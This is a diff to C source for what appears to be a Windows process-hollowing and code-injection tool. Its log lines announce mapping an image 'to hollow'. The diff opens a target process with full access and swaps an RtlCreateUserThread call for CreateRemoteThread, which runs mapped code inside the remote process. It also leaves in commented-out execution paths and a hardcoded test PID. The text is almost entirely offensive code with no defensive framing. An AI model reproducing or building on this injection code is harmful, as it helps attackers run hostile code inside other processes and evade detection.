@@ -376,6 +376,7 @@ BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA) {
 typedef void(*fnAddr)(VOID);
 
 INT main() {
+	NTSTATUS				ntStatus;
 	BOOL					bIsElevated = FALSE;
 	BOOL					bTxF = TRUE;
 	HANDLE					hProcessToken = NULL;
@@ -423,6 +424,7 @@ INT main() {
 
 		// Get handle to process
 		dwPid = processInformation.dwProcessId;
+		//dwPid = 4700;
 		if ((hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) != INVALID_HANDLE_VALUE) {
 
 			// Hollow!
@@ -431,17 +433,25 @@ INT main() {
 				printf("[+] Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", (const PCHAR)pMapBuf, qwMapBufSize);
 				printf("[*] Calling 0x%p...\r\n", (const PCHAR)pMappedCode);
 
-				NTSTATUS status = pRtlCreateUserThread(hProcessHandle, NULL, FALSE, 0, 0, 0, pMappedRemoteCode, NULL, &hTargetThreadHandle, NULL);
-				((fnAddr)pMappedCode)();
+				//((fnAddr)pMappedCode)();
 				//((fnAddr)pMappedRemoteCode)();
+
+				//ntStatus = pRtlCreateUserThread(hProcessHandle, NULL, FALSE, 0, 0, 0, pMappedRemoteCode, NULL, &hTargetThreadHandle, NULL);
+				//if (NT_SUCCESS(ntStatus)) {
+				//	puts("[+] Created thread\r\n");
+				//}
+
+				if ((hTargetThreadHandle = CreateRemoteThread(hProcessHandle, NULL, 0, (PTHREAD_START_ROUTINE)pMappedRemoteCode, NULL, 0, NULL)) == NULL) {
+					printf("[-] Unable to create a thread in the remote process: (%lu).\r\n", GetLastError());
+				}
 			}
 		}
 		else {
-			printf("[-] Could not get handle to target process: (%lu).\n", GetLastError());
+			printf("[-] Could not get handle to target process: (%lu).\r\n", GetLastError());
 		}
 	}
 	else {
-		printf("[-] CreateProcess failed: (%lu).\n", GetLastError());
+		printf("[-] CreateProcess failed: (%lu).\r\n", GetLastError());
 	}
 
 	// Cleanup
